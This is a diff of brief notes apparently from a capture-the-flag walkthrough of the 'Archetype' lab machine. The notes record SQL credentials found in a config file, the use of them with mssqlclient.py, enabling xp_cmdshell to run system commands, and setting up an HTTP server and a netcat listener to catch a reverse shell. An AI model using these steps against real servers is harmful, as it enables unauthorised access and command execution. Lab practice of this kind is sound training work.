@@ -14,7 +14,7 @@ nano prod.dtsConfig
 ### we find sql creds in this file and will try to connect with mssqlclient.py
 ### Password = M3g4c0rp123 ### User = ARCHETYPE\sql_svc
 
-mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
 SELECT IS_SRVROLEMEMBER ('sysadmin')
 
 EXEC sp_configure 'Show Advanced Options', 1;
@@ -30,7 +30,7 @@ xp_cmdshell "whoami"
 sudo python3 -m http.server 8080
 
 nc -lvnp 443
-ufw allow from 10.10.10.27 proto tcp to any port 8080,443
+ufw allow from 10.10.10.27 proto tcp to any port 80,443
 
 
 
